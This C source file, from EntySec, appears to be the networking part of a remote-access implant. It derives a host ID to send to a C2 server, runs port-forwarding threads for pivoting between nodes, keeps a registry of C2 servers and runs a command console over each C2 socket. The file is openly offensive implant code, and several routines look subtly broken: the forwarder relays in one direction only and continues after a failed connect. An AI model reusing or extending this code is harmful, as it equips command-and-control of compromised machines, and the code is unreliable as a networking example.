/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

#ifndef WINDOWS
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#else
#include <winsock2.h>
#endif

#include <log.h>
#include <tlv.h>
#include <console.h>
#include <net.h>

#include <uthash/uthash.h>

/*
 * Obtain local hostname, can be used as a unique ID of the machine
 * which can be sent to the C2 instead of an UUID.
 */

char *net_local_hostname()
{
    char *buffer = (char *)malloc(MAX_HOSTNAME_BUF + 1);
    gethostname(buffer, MAX_HOSTNAME_BUF + 1);
    return buffer; /* must be freed when time comes... */
}

/*
 * Thread for traffic forwarder between nodes.
 */

static void *net_traffic_forward(void *net_node_new)
{
    net_node_t *net_node_data = (net_node_t *)net_node_new;

    int sock_from = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_from == -1)
        return NULL;

    struct sockaddr_in addr_from = {
        .sin_family = AF_INET,
        .sin_port = htons(net_node_data->net_node_src_port),
        .sin_addr.s_addr = net_node_data->net_node_src_host
    };

    if (bind(sock_from, (struct sockaddr *)&addr_from, sizeof(addr_from)) == -1)
        return NULL;

    if (listen(sock_from, 5) == -1)
        return NULL;

    for (;;)
    {
        struct sockaddr_in addr_to;
        socklen_t addr_to_len = sizeof(addr_to);
        int sock_to = accept(sock_from, (struct sockaddr *)&addr_to, &addr_to_len);
        if (sock_to == -1)
            return NULL;

        int new_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (new_sock == -1)
            return NULL;

        struct sockaddr_in addr_new = {
            .sin_family = AF_INET,
            .sin_port = htons(net_node_data->net_node_dst_port),
            .sin_addr.s_addr = net_node_data->net_node_dst_host
        };

        if (connect(new_sock, (struct sockaddr *)&addr_new, sizeof(addr_new)) == -1)
        {
            close(sock_to);
            close(new_sock);
        }

        log_debug("* New connection: %s:%d -> %s:%d\n", inet_ntoa(addr_to.sin_addr),
                  ntohs(addr_to.sin_port), inet_ntoa(addr_from.sin_addr),
                  net_node_data->net_node_src_port);

        fd_set set;
        FD_ZERO(&set);
        int max_fd = (sock_to > new_sock) ? sock_to : new_sock;

        for (;;)
        {
            FD_SET(sock_to, &set);
            FD_SET(new_sock, &set);

            if (select(max_fd + 1, &set, NULL, NULL, NULL) == -1)
                break;

            if (FD_ISSET(sock_to, &set))
            {
                char buffer[NET_NODE_CHUNK];
                ssize_t bytes_read = recv(new_sock, buffer, sizeof(buffer), 0);

                if (bytes_read <= 0)
                    break;

                send(sock_to, buffer, bytes_read, 0);
            }
        }

        log_debug("* Connection closed: %s:%d -> %s:%d\n", inet_ntoa(addr_to.sin_addr),
                  ntohs(addr_to.sin_port), inet_ntoa(addr_from.sin_addr),
                  net_node_data->net_node_src_port);

        close(sock_to);
        close(new_sock);
    }

    close(sock_from);

    return NULL;
}

/*
 * Add single net node.
 */

void net_nodes_add(net_nodes_t **net_nodes_table, int net_node_id, net_node_t net_node_new)
{
    net_nodes_t *net_nodes_new = calloc(1, sizeof(*net_nodes_new));

    if (net_nodes_new != NULL)
    {
        net_nodes_new->net_node_id = net_node_id;

        if (pthread_create(&(net_nodes_new->net_node_handle), NULL, net_traffic_forward, (void *)&net_node_new) != 0)
        {
            net_nodes_free(net_nodes_new);
            return;
        }

        net_nodes_t *net_nodes_data_new;
        HASH_FIND_INT(*net_nodes_table, &net_node_id, net_nodes_data_new);

        if (net_nodes_data_new == NULL)
        {
            HASH_ADD_INT(*net_nodes_table, net_node_id, net_nodes_new);
            log_debug("* Added net node entry (%d)\n", net_node_id);
        }
    }
}

/*
 * Delete single net node.
 */

void net_nodes_delete(net_nodes_t **net_nodes_table, int net_node_id)
{
    net_nodes_t *net_nodes_data;
    HASH_FIND_INT(*net_nodes_table, &net_node_id, net_nodes_data);

    if (net_nodes_data != NULL)
    {
        pthread_cancel(net_nodes_data->net_node_handle);
        HASH_DEL(*net_nodes_table, net_nodes_data);

        log_debug("* Deleted net node entry (%d)\n", net_node_id);
    }
}

/*
 * Add C2 server. Solves the problem of multiple C2 servers.
 */

void net_c2_add(net_c2_t **net_c2_data, int net_c2_id, int net_c2_fd, char *net_c2_name)
{
    net_c2_t *net_c2_new = calloc(1, sizeof(*net_c2_new));

    if (net_c2_new != NULL)
    {
        net_c2_new->net_c2_id = net_c2_id;
        net_c2_new->net_c2_fd = net_c2_fd;
        net_c2_new->net_c2_name = net_c2_name;

        net_c2_t *net_c2_data_new;
        HASH_FIND_INT(*net_c2_data, &net_c2_id, net_c2_data_new);

        if (net_c2_data_new == NULL)
        {
            HASH_ADD_INT(*net_c2_data, net_c2_id, net_c2_new);
            log_debug("* Added net C2 entry (%d) - (%s)\n", net_c2_id, net_c2_name);
        }
    }
}

/*
 * Initialize C2 servers one by one. Initialization is a process, when
 * client takes C2 server socket fd and executes TLV console loop with it.
 * Final step is a clean up, when we delete C2 server from our records.
 */

void net_c2_init(net_c2_t *net_c2_data)
{
    net_c2_t *c2;

    for (c2 = net_c2_data; c2 != NULL; c2 = c2->hh.next)
    {
        tlv_pkt_t *tlv_packet = tlv_channel_pkt(c2->net_c2_fd);
        tlv_console_loop(tlv_packet);

        tlv_channel_close(tlv_packet);
        tlv_pkt_free(tlv_packet);

        log_debug("* Freed net C2 (%d) (%s)\n", c2->net_c2_id, c2->net_c2_name);
        HASH_DEL(net_c2_data, c2);

        free(c2->net_c2_name);
        free(c2);
    }

    free(net_c2_data);
}

/*
 * Free single net node.
 */

void net_nodes_free(net_nodes_t *net_nodes_table)
{
    net_nodes_t *node;

    for (node = net_nodes_table; node != NULL; node = node->hh.next)
    {
        log_debug("* Freed net node (%d)\n", node->net_node_id);

        pthread_cancel(node->net_node_handle);
        HASH_DEL(net_nodes_table, node);

        free(node);
    }

    free(net_nodes_table);
}